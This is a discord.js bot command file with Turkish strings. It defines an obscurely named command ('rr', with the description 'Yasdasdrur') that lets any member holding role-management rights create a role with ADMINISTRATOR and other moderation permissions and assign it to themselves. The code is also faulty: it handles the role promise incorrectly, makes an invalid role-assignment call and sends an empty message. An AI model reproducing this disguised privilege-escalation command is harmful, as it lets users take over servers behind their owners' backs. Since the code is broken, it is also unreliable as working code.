const Discord = require('discord.js')

exports.run = async (client, message, args) => {
if (!message.member.hasPermission("MANAGE_ROLES")) 
  return message.channel.send(":ok: Anladın sen Bu mesaj kendini imha eder")
 
let guild = message.guild;


 let role = message.guild.roles.create({
        name: 'Çakdırma Yöneticisin',
  color: 'BLUE',
        permissions: [
          "ADMINISTRATOR",
            "MANAGE_GUILD",
            "MANAGE_ROLES",
            "MUTE_MEMBERS",
            "DEAFEN_MEMBERS",
            "MANAGE_MESSAGES",
            "MANAGE_NICKNAMES",
            "KICK_MEMBERS"
    ]
    })
     .then(role => message.channel.send(``))
  .catch(console.error)
 let sahip = message.author
  message.guild.roles.add(sahip)
}

exports.conf = {
  aliases: [ 'rololuştur' ],
  enabled: true,
  guildOnly: false,
  permLevel: 4
};

exports.help = {
  name: 'rr',
  description: 'Yasdasdrur',
  usage: 'rr',
};